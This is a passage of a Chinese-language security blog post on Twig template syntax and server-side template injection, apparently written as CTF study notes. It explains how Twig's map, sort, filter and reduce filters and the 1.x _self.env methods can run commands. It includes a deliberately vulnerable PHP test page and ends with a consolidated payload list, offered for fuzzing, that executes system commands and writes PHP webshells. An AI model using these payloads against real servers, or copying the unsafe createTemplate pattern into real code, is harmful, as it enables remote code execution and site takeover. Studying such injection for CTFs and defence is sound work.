<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% set people = [</span><br><span class="line">    &#123;first: <span class="string">&quot;Bob&quot;</span>, last: <span class="string">&quot;Smith&quot;</span>&#125;,</span><br><span class="line">    &#123;first: <span class="string">&quot;Alice&quot;</span>, last: <span class="string">&quot;Dupond&quot;</span>&#125;,</span><br><span class="line">] %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; people|<span class="title function_ invoke__">map</span>(p =&gt; <span class="string">&quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;</span>)|<span class="title function_ invoke__">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span><br><span class="line">&#123;<span class="comment"># outputs Bob Smith, Alice Dupond #&#125;</span></span><br></pre></td></tr></table></figure>

<p>获取map的值，并以数组形式返回，所以需要join</p>
<p>也可以获取map的key</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% set people = &#123;</span><br><span class="line">    <span class="string">&quot;Bob&quot;</span>: <span class="string">&quot;Smith&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Alice&quot;</span>: <span class="string">&quot;Dupond&quot;</span>,</span><br><span class="line">&#125; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; people|<span class="title function_ invoke__">map</span>((value, key) =&gt; <span class="string">&quot;#&#123;key&#125; #&#123;value&#125;&quot;</span>)|<span class="title function_ invoke__">join</span>(<span class="string">&#x27;, &#x27;</span>) &#125;&#125;</span><br><span class="line">&#123;<span class="comment"># outputs Bob Smith, Alice Dupond #&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h4><p>对于数组来说，直接加到最后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% set values = [<span class="number">1</span>, <span class="number">2</span>] %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set values = values|<span class="title function_ invoke__">merge</span>([<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>]) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># values now contains [1, 2, &#x27;apple&#x27;, &#x27;orange&#x27;] #&#125;</span></span><br></pre></td></tr></table></figure>

<p>对于map来说，如果key不存在则直接加入，key存在则覆盖</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% set items = &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>: <span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;peugeot&#x27;</span>: <span class="string">&#x27;unknown&#x27;</span>&#125; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set items = items|<span class="title function_ invoke__">merge</span>(&#123; <span class="string">&#x27;peugeot&#x27;</span>: <span class="string">&#x27;car&#x27;</span>, <span class="string">&#x27;renault&#x27;</span>: <span class="string">&#x27;car&#x27;</span> &#125;) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># items now contains &#123;&#x27;apple&#x27;: &#x27;fruit&#x27;, &#x27;orange&#x27;: &#x27;fruit&#x27;, &#x27;peugeot&#x27;: &#x27;car&#x27;, &#x27;renault&#x27;: &#x27;car&#x27;&#125; #&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>可以包含一个模板，且这个模板会根据上下文去获取变量进行渲染，也就是说如果开发者包含的模板中的变量也是可控的，就也是可以利用的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="keyword">include</span>(<span class="string">&#x27;template.html&#x27;</span>) &#125;&#125;</span><br><span class="line">&#123;&#123; <span class="keyword">include</span>(some_var) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>但是如果加入了with_context参数就不行了，但默认开启</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="comment"># only the foo variable will be accessible #&#125;</span></span><br><span class="line">&#123;&#123; <span class="keyword">include</span>(<span class="string">&#x27;template.html&#x27;</span>, &#123;foo: <span class="string">&#x27;bar&#x27;</span>&#125;, with_context = <span class="literal">false</span>) &#125;&#125;</span><br><span class="line">&#123;<span class="comment"># no variables will be accessible #&#125;</span></span><br><span class="line">&#123;&#123; <span class="keyword">include</span>(<span class="string">&#x27;template.html&#x27;</span>, with_context = <span class="literal">false</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="title function_ invoke__">random</span>([<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;citrus&#x27;</span>]) &#125;&#125; &#123;<span class="comment"># example output: orange #&#125;</span></span><br><span class="line">&#123;&#123; <span class="title function_ invoke__">random</span>(<span class="string">&#x27;ABC&#x27;</span>) &#125;&#125;                         &#123;<span class="comment"># example output: C #&#125;</span></span><br><span class="line">&#123;&#123; <span class="title function_ invoke__">random</span>() &#125;&#125;                              &#123;<span class="comment"># example output: 15386094 (works as the native PHP mt_rand function) #&#125;</span></span><br><span class="line">&#123;&#123; <span class="title function_ invoke__">random</span>(<span class="number">5</span>) &#125;&#125;                             &#123;<span class="comment"># example output: 3 #&#125;</span></span><br><span class="line">&#123;&#123; <span class="title function_ invoke__">random</span>(<span class="number">50</span>, <span class="number">100</span>) &#125;&#125;                       &#123;<span class="comment"># example output: 63 #&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Members&lt;/h1&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &#123;% <span class="keyword">for</span> user in users %&#125;</span><br><span class="line">        &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> users|length &gt; <span class="number">0</span> %&#125;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &#123;% <span class="keyword">for</span> user in users %&#125;</span><br><span class="line">            &lt;li&gt;&#123;&#123; user.username|e &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Twig模板注入"><a href="#Twig模板注入" class="headerlink" title="Twig模板注入"></a>Twig模板注入</h1><p>和其他模板注入造成的原因一样，动态创建模板时让用户输入的数据先注入了模板后渲染</p>
<h2 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x&#x2F;3.x"></a>Twig 2.x&#x2F;3.x</h2><p>测试代码如下：</p>
<ul>
<li>index.php</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>();</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">createTemplate</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$template</span>-&gt;<span class="title function_ invoke__">render</span>();</span><br></pre></td></tr></table></figure>

<h3 id="map-1"><a href="#map-1" class="headerlink" title="map"></a>map</h3><p>当我们如下使用 <code>map</code> 时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;Mark&quot;]|map((arg)=&gt;&quot;Hello #&#123;arg&#125;!&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Twig 3.x 会将其编译成：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">twig_array_map</span>([<span class="number">0</span> =&gt; <span class="string">&quot;Mark&quot;</span>], function (<span class="variable">$__arg__</span>) <span class="keyword">use</span> ($<span class="title">context</span>, $<span class="title">macros</span>) &#123; $<span class="title">context</span>[&quot;<span class="title">arg</span>&quot;] = $<span class="title">__arg__</span>; <span class="keyword">return</span> (<span class="string">&quot;hello &quot;</span> . (<span class="variable">$context</span>[<span class="string">&quot;arg&quot;</span>] ?? <span class="literal">null</span>))&#125;)</span><br></pre></td></tr></table></figure>

<p>这个 <code>twig_array_map</code> 函数的源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_map</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$r</span>[<span class="variable">$k</span>] = <span class="variable">$arrow</span>(<span class="variable">$v</span>, <span class="variable">$k</span>);    <span class="comment">// 直接将 $arrow 当做函数执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我有点存疑的是，传入的闭包函数只需要一个参数，但是$arrow却传递了两个参数，自己试了一下发现没啥问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$a</span>(<span class="number">123</span>,<span class="number">123</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>总结一下上面发生了什么</p>
<ul>
<li>传入的数组[“mark”]在编译的时候自动帮我们补了一个键值0</li>
<li>传入的<code>arrow function (arg)=&gt;&quot;Hello #&#123;arg&#125;!&quot;</code>被编译为了一个闭包函数在函数体内被调用</li>
<li>传入的键值对作为参数传入了闭包函数，也就是$arrow($v,$k)</li>
</ul>
<p>但当我们传入的不是arrow function而是字符串呢</p>
<p>eg:<code>&#123;&#123;["whoami"]|map("system")&#125;&#125;</code></p>
<p>字符串并不会被编译成什么函数，它就是一个字符串</p>
<p><code>twig_array_map([0 =&gt; &quot;id&quot;], &quot;sysetm&quot;)</code></p>
<p>所以<code>$arrow()</code>的调用就变成了</p>
<p><code>system(&#39;whoami&#39;,0)</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903101752498.png"  alt="image-20240903101752498"></p>
<p><code>system()</code>函数恰巧就可以有两个参数</p>
<p>所以被成功执行</p>
<p>同理以下函数也可以使用</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903102859250.png"  alt="image-20240903102859250"></p>
<p>passthru(<a class="link"   href="https://www.php.net/manual/zh/language.types.string.php" >string<i class="fas fa-external-link-alt"></i></a> <code>$command</code>, <a class="link"   href="https://www.php.net/manual/zh/language.types.integer.php" >int<i class="fas fa-external-link-alt"></i></a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>): <a class="link"   href="https://www.php.net/manual/zh/language.types.null.php" >?<i class="fas fa-external-link-alt"></i></a><a class="link"   href="https://www.php.net/manual/zh/language.types.value.php" >false<i class="fas fa-external-link-alt"></i></a></p>
<p>exec(<a class="link"   href="https://www.php.net/manual/zh/language.types.string.php" >string<i class="fas fa-external-link-alt"></i></a> <code>$command</code>, <a class="link"   href="https://www.php.net/manual/zh/language.types.array.php" >array<i class="fas fa-external-link-alt"></i></a> <code>&amp;$output</code> &#x3D; <strong><code>null</code></strong>, <a class="link"   href="https://www.php.net/manual/zh/language.types.integer.php" >int<i class="fas fa-external-link-alt"></i></a> <code>&amp;$result_code</code> &#x3D; <strong><code>null</code></strong>): <a class="link"   href="https://www.php.net/manual/zh/language.types.string.php" >string<i class="fas fa-external-link-alt"></i></a>|<a class="link"   href="https://www.php.net/manual/zh/language.types.value.php" >false<i class="fas fa-external-link-alt"></i></a></p>
<p>popen(<a class="link"   href="https://www.php.net/manual/zh/language.types.string.php" >string<i class="fas fa-external-link-alt"></i></a> <code>$command</code>, <a class="link"   href="https://www.php.net/manual/zh/language.types.string.php" >string<i class="fas fa-external-link-alt"></i></a> <code>$mode</code>): <a class="link"   href="https://www.php.net/manual/zh/language.types.resource.php" >resource<i class="fas fa-external-link-alt"></i></a>|<a class="link"   href="https://www.php.net/manual/zh/language.types.value.php" >false<i class="fas fa-external-link-alt"></i></a></p>
<p>popen有些特殊，因为第二个参数需要是<code>r</code>或者<code>w</code></p>
<p>所以要传入键值对<code>&#123;&#123;&#123;'r':'whoami'&#125;|map('popen')&#125;&#125;</code></p>
<p>还支持写马操作</p>
<p><code>?name=&#123;&#123;&#123;"<?php%20phpinfo();":"shell.php"&#125;|map("file_put_contents")&#125;&#125;</code></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php%20phpinfo();&quot;:&quot;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&#x27;r&#x27;:&#x27;whoami&#x27;&#125;|map(&#x27;popen&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>前期原理与<code>map</code>一致，都是把原本需要的arrow function错传成了字符串导致rce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_sort_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$array</span> <span class="keyword">instanceof</span> \<span class="built_in">Traversable</span>) &#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeError</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;</span>, \<span class="title function_ invoke__">gettype</span>(<span class="variable">$array</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== <span class="variable">$arrow</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">uasort</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>);    <span class="comment">// 直接被 uasort 调用 </span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">asort</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里学到一个新的危险函数uasort()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=[<span class="string">&#x27;calc&#x27;</span>,<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以payload就很简单了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;whoami&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;,&quot;r&quot;]|sort(&quot;popen&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;shell1.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;]|sort(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>一样的arrow function</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_filter</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">array_filter</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>, \ARRAY_FILTER_USE_BOTH);    <span class="comment">// $array 和 $arrow 直接被 array_filter 函数调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">\CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="title class_">\IteratorIterator</span>(<span class="variable">$array</span>), <span class="variable">$arrow</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一样的对数组进行命令操作，危险函数<code>array_filter()</code></p>
<p>这里在试popen的时候发现它的机制和map很像（可以看见自己给我们补了个0且在第二个参数），也是可以获取键值对的，也就说两个参数也可以使用</p>
<p><code>&#123;&#123;["whoami"]|filter("popen")&#125;&#125;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903130530833.png"  alt="image-20240903130530833"></p>
<p>传入r<code>&#123;&#123;&#123;"r":"calc"&#125;|filter("popen")&#125;&#125;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903130800919.png"  alt="image-20240903130800919"></p>
<p>但是没有回显，所以写马操作也可以</p>
<p><code>&#123;&#123;&#123;"<?php phpinfo();?>":"shell2.php"&#125;|filter("file_put_contents")&#125;&#125;</code></p>
<p>第一个参数应该在就是value，第二个参数是key</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[&quot;whoami&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&quot;r&quot;:&quot;calc&quot;&#125;|filter(&quot;popen&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();?&gt;&quot;:&quot;shell2.php&quot;&#125;|filter(&quot;file_put_contents&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twig_array_reduce</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$arrow</span>, <span class="variable">$initial</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!\<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$array</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">array_reduce</span>(<span class="variable">$array</span>, <span class="variable">$arrow</span>, <span class="variable">$initial</span>);    <span class="comment">// $array, $arrow 和 $initial 直接被 array_reduce 函数调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>危险函数<code>array_reduce()</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903131452002.png"  alt="image-20240903131452002"></p>
<p>按说明是不好写马，目前还没发现能写马的办法，留个坑</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;whoami&quot;)&#125;&#125;  </span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;popen&quot;, &quot;whoami&quot;,&quot;r&quot;)&#125;&#125;  </span><br></pre></td></tr></table></figure>

<h2 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h2><p>直接<code>composer require</code>都是最新版3+</p>
<p>下载1.x版<code>composer require twig/twig:~1.0</code></p>
<p>实验一下如果是返回字符串则版本不对,2往后的版本才会</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903155713196.png"  alt="image-20240903155713196"></p>
<p>在 Twig 1.x 中存在三个全局变量：</p>
<ul>
<li><code>_self</code>：引用当前模板的实例。</li>
<li><code>_context</code>：引用当前上下文。</li>
<li><code>_charset</code>：引用当前字符集。</li>
</ul>
<p>利用 <code>_self</code> 变量返回当前 <code>\Twig\Template</code> 实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行 SSTI。</p>
<p>比如以下 Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;file:///etc/passwd&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>此外还有 <code>getFilter</code> 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;filterCallbacks <span class="keyword">as</span> <span class="variable">$callback</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$filter</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callback</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerUndefinedFilterCallback</span>(<span class="params"><span class="variable">$callable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;filterCallbacks[] = <span class="variable">$callable</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在 <code>getFilter</code> 里发现了危险函数 <code>call_user_func</code>。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line">// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h1 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h1><h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>cookie的user值存在Twig模板注入，直接payload全放上去fuzz</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903160309808.png"  alt="image-20240903160309808"></p>
<p>最后只有Twig1.x的payload能打出来</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240903155643738.png"  alt="image-20240903155643738"></p>
<h3 id="VolgaCTF-2020-Qualifier-Newsletter"><a href="#VolgaCTF-2020-Qualifier-Newsletter" class="headerlink" title="[VolgaCTF 2020 Qualifier]Newsletter"></a>[VolgaCTF 2020 Qualifier]Newsletter</h3><p>找不到原题了</p>
<p>总之学了个绕过<code>filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);</code></p>
<p>只要@前面用双引号包裹起来就能绕过了</p>
<p>Stack Overflow还是好用啊啥都能找到，学好英语还是很有必要的</p>
<h1 id="payload大全"><a href="#payload大全" class="headerlink" title="payload大全"></a>payload大全</h1><p>方便fuzz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&quot;&lt;?php%20phpinfo();&quot;:&quot;shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&#x27;r&#x27;:&#x27;whoami&#x27;&#125;|map(&#x27;popen&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;calc&quot;,&quot;r&quot;]|sort(&quot;popen&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;shell1.php&quot;,&quot;&lt;?php phpinfo();?&gt;&quot;]|sort(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;]|filter(&quot;system&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;]|filter(&quot;passthru&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;whoami&quot;]|filter(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&quot;r&quot;:&quot;calc&quot;&#125;|filter(&quot;popen&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();?&gt;&quot;:&quot;shell2.php&quot;&#125;|filter(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;whoami&quot;)&#125;&#125;  </span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;popen&quot;, &quot;whoami&quot;,&quot;r&quot;)&#125;&#125;  </span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.setCache(&quot;file:///etc/passwd&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
